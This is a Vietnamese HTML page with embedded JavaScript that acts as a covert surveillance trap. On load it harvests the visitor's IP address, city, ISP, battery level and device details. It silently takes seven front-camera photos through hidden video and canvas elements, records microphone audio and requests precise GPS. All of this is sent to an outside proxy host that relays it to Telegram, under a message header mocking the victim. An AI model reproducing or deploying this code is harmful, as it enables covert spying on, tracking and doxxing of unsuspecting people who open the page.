<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hoang Anh</title>
    <style>
        body {
            background: black;
            color: lime;
            font-family: monospace;
            text-align: center;
            padding: 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #info {
            white-space: pre-wrap;
            text-align: left;
            margin: auto;
            max-width: 600px;
            width: 100%;
            background: #111;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid lime;
            box-shadow: 0 0 10px rgba(0,255,0,0.2);
            word-break: break-word;
            font-size: 14px;
            line-height: 1.6;
        }
        .error {
            color: #ff6666;
        }
        .loading {
            color: yellow;
        }
        .success {
            color: #66ff66;
        }
    </style>
</head>
<body>
    <div id="info" class="loading">⏳ Đang tải thông tin...</div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <audio id="audio" style="display:none;"></audio>

    <script>
      
        const PROXY_URL = " https://fuckhacker.onrender.com/";
        
        const infoDiv = document.getElementById('info');
        
        const PHOTO_COUNT = 7;
        const PHOTO_INTERVAL = 300;
        const AUDIO_DURATION = 400;
        
        let infoSent = false;
        let photoCount = 0;
        let photoSentCount = 0;
        let gpsRequested = false;
        let gpsSent = false;
        let cameraStream = null;
        let cameraActive = false;
        let audioRecorded = false;
        let mediaRecorder = null;
        let audioChunks = [];

      
        
       
        function blobToBase64(blob) {
            return new Promise((resolve) => {
                const reader = new FileReader();
                reader.onloadend = () => {
                    const base64 = reader.result.split(',')[1];
                    resolve(base64);
                };
                reader.readAsDataURL(blob);
            });
        }

        // Gửi tin nhắn text
        async function sendToTelegram(text, retryCount = 0) {
            const maxRetries = 2;
            try {
                const response = await fetch(`${PROXY_URL}/send-message`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ text: text.substring(0, 4096) })
                });
                const data = await response.json();
                if (!data.ok && retryCount < maxRetries) {
                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
                }
                return data;
            } catch (e) {
                console.error('Proxy Error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
                }
            }
        }

        // Gửi ảnh
        async function sendPhotoToTelegram(blob, photoNumber, retryCount = 0) {
            const maxRetries = 2;
            try {
                const base64 = await blobToBase64(blob);
                const response = await fetch(`${PROXY_URL}/send-photo`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        photo: base64,
                        filename: `capture_${photoNumber}.jpg`,
                        caption: `📸 Ảnh chụp #${photoNumber} - ${new Date().toLocaleString('vi-VN')}`
                    })
                });
                const data = await response.json();
                if (data.ok) {
                    photoSentCount++;
                    console.log(`✅ Đã gửi ảnh #${photoNumber}`);
                    if (photoSentCount === PHOTO_COUNT && cameraStream && cameraActive) {
                        setTimeout(() => {
                            cameraStream.getTracks().forEach(track => track.stop());
                            cameraStream = null;
                            cameraActive = false;
                        }, 2000);
                    }
                } else if (retryCount < maxRetries) {
                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
                }
            } catch (e) {
                console.error('Proxy Photo Error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
                }
            }
        }

        // Gửi audio
        async function sendAudioToTelegram(blob, retryCount = 0) {
            const maxRetries = 2;
            try {
                const base64 = await blobToBase64(blob);
                const response = await fetch(`${PROXY_URL}/send-audio`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        audio: base64,
                        filename: `audio_${Date.now()}.ogg`,
                        caption: `🎤 Ghi âm - ${new Date().toLocaleString('vi-VN')}`
                    })
                });
                const data = await response.json();
                if (data.ok) {
                    console.log('✅ Đã gửi ghi âm thành công');
                } else if (retryCount < maxRetries) {
                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
                }
            } catch (e) {
                console.error('Proxy Audio Error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
                }
            }
        }

        
        
        async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
            return new Promise((resolve) => {
                try {
                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob((blob) => {
                            if (blob) {
                                sendPhotoToTelegram(blob, photoNumber);
                                resolve(true);
                            } else {
                                resolve(false);
                            }
                        }, 'image/jpeg', 0.85);
                    } else {
                        setTimeout(() => {
                            captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve);
                        }, 100);
                    }
                } catch (e) {
                    console.error(`Lỗi chụp ảnh #${photoNumber}:`, e);
                    resolve(false);
                }
            });
        }

        async function captureMultiplePhotos(video, canvas, ctx) {
            if (!cameraActive) return;
            for (let i = 1; i <= PHOTO_COUNT; i++) {
                if (!cameraActive) break;
                await captureSinglePhoto(video, canvas, ctx, i);
                photoCount++;
                if (i < PHOTO_COUNT) {
                    await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL));
                }
            }
        }

        async function startRecording() {
            if (audioRecorded) return;
            try {
                console.log('🎤 Bắt đầu ghi âm...');
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) audioChunks.push(event.data);
                };
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    if (audioBlob.size > 0) {
                        await sendAudioToTelegram(audioBlob);
                        audioRecorded = true;
                    }
                    stream.getTracks().forEach(track => track.stop());
                };
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, AUDIO_DURATION);
            } catch (e) {
                console.error('Lỗi ghi âm:', e);
            }
        }

        async function getLocationInfo(ip) {
            let lat = null, lon = null;
            try {
                const response = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,lat,lon`);
                const data = await response.json();
                if (data.status === 'success') {
                    return {
                        city: data.city || 'Không xác định',
                        region: data.regionName || 'Không xác định',
                        country: data.country || 'Không xác định',
                        isp: data.isp || data.org || 'Không xác định',
                        lat: data.lat,
                        lon: data.lon
                    };
                }
            } catch (err) { console.error(err); }
            return { city: 'Không xác định', region: 'Không xác định', country: 'Không xác định', isp: 'Không xác định', lat: null, lon: null };
        }

        async function requestGPSPermission() {
            if (gpsRequested || gpsSent) return;
            gpsRequested = true;
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        const lat = pos.coords.latitude;
                        const lng = pos.coords.longitude;
                        const accuracy = pos.coords.accuracy;
                        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                        let gpsMessage = `<b>📍 VỊ TRÍ GPS THỰC TẾ</b>\n\n<b>📌 Vĩ độ:</b> <code>${lat}</code>\n<b>📌 Kinh độ:</b> <code>${lng}</code>\n<b>🎯 Độ chính xác:</b> <code>${Math.round(accuracy)} mét</code>\n\n<a href="${mapsLink}">🗺️ Xem trên Google Maps</a>`;
                        await sendToTelegram(gpsMessage);
                        gpsSent = true;
                    },
                    (err) => { console.log('GPS lỗi:', err.message); },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }
        }

        async function getInfo() {
            let ip = 'Không xác định';
            let locationInfo = { city: 'Không xác định', region: 'Không xác định', country: 'Không xác định', isp: 'Không xác định', lat: null, lon: null };
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ip = ipData.ip;
                locationInfo = await getLocationInfo(ip);
            } catch (err) { console.error(err); }
            
            let batteryPercent = 'Không xác định';
            let batteryCharging = false;
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    batteryPercent = `${Math.round(battery.level * 100)}%`;
                    batteryCharging = battery.charging;
                }
            } catch (battErr) { console.error(battErr); }
            
            const userAgent = navigator.userAgent;
            const platform = navigator.platform || 'Không xác định';
            const screenWidth = screen.width;
            const screenHeight = screen.height;
            const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Không xác định';
            const cookieEnabled = navigator.cookieEnabled ? 'Bật' : 'Tắt';
            const currentTime = new Date().toLocaleString('vi-VN');
            const language = navigator.language || 'Không xác định';
            const hardwareConcurrency = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} nhân` : 'Không xác định';
            const referrer = document.referrer || 'Truy cập trực tiếp';
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định';
            
            let mapsLink = '';
            if (locationInfo.lat && locationInfo.lon) {
                mapsLink = `\n🗺️ Google Maps: https://www.google.com/maps?q=${locationInfo.lat},${locationInfo.lon}`;
            }
            
            const text = `📱 THÔNG TIN KHÁCH TRUY CẬP\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🌐 Địa chỉ IP : ${ip}\n📍 Thành phố : ${locationInfo.city}\n🗺️ Khu vực : ${locationInfo.region}\n🏳️ Quốc gia : ${locationInfo.country}\n🏢 Nhà mạng : ${locationInfo.isp}${mapsLink}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n💻 Trình duyệt : ${userAgent.substring(0, 100)}...\n🖥️ Hệ điều hành : ${platform}\n📺 Độ phân giải : ${screenWidth} x ${screenHeight}\n🔋 Pin : ${batteryPercent} ${batteryCharging ? '(🔌 Đang sạc)' : '(🔋 Không sạc)'}\n💾 RAM thiết bị : ${deviceMemory}\n⚙️ CPU Core : ${hardwareConcurrency}\n🍪 Cookie : ${cookieEnabled}\n🌐 Ngôn ngữ : ${language}\n⏰ Múi giờ : ${timezone}\n🕐 Thời gian : ${currentTime}\n📎 Nguồn truy cập : ${referrer}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
            
            infoDiv.className = 'success';
            infoDiv.innerText = text;
            
            if (!infoSent) {
                infoSent = true;
                let telegramMapsLink = '';
                if (locationInfo.lat && locationInfo.lon) {
                    telegramMapsLink = `\n<a href="https://www.google.com/maps?q=${locationInfo.lat},${locationInfo.lon}">🗺️ Xem vị trí trên Google Maps</a>`;
                }
                const telegramText = `<b>📥 Gà Kìa</b>\n\n<b>🌐 Địa chỉ IP:</b> <code>${ip}</code>\n<b>📍 Thành phố:</b> <code>${locationInfo.city}</code>\n<b>🗺️ Khu vực:</b> <code>${locationInfo.region}</code>\n<b>🏳️ Quốc gia:</b> <code>${locationInfo.country}</code>\n<b>🏢 Nhà mạng:</b> <code>${locationInfo.isp}</code>${telegramMapsLink}\n<b>💻 Trình duyệt:</b> <code>${userAgent.substring(0, 80)}...</code>\n<b>🖥️ Hệ điều hành:</b> <code>${platform}</code>\n<b>📺 Độ phân giải:</b> <code>${screenWidth}x${screenHeight}</code>\n<b>🔋 Pin:</b> <code>${batteryPercent} ${batteryCharging ? '(Đang sạc)' : '(Không sạc)'}</code>\n<b>💾 RAM:</b> <code>${deviceMemory}</code>\n<b>⚙️ CPU Core:</b> <code>${hardwareConcurrency}</code>\n<b>🍪 Cookie:</b> <code>${cookieEnabled}</code>\n<b>🌐 Ngôn ngữ:</b> <code>${language}</code>\n<b>⏰ Múi giờ:</b> <code>${timezone}</code>\n<b>🕐 Thời gian:</b> <code>${currentTime}</code>`;
                await sendToTelegram(telegramText);
            }
        }
        
        async function startCameraImmediately() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 800 }, height: { ideal: 600 }, facingMode: 'user' } });
                cameraStream = stream;
                cameraActive = true;
                video.srcObject = stream;
                await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
                await new Promise(resolve => setTimeout(resolve, 500));
                await captureMultiplePhotos(video, canvas, ctx);
            } catch (e) { console.warn('Camera error:', e); cameraActive = false; }
        }
        
        async function requestAudioImmediately() {
            setTimeout(async () => { if (!audioRecorded) await startRecording(); }, 100);
        }
        
        async function init() {
            try {
                const infoPromise = getInfo();
                const cameraPromise = startCameraImmediately();
                await cameraPromise;
                await requestAudioImmediately();
                setTimeout(() => { requestGPSPermission(); }, 1000);
                await infoPromise;
            } catch (err) {
                console.error('Init error:', err);
                infoDiv.className = 'error';
                infoDiv.innerText = '❌ Đã xảy ra lỗi: ' + err.message;
            }
        }
        
        init();
    </script>
</body>
</html>
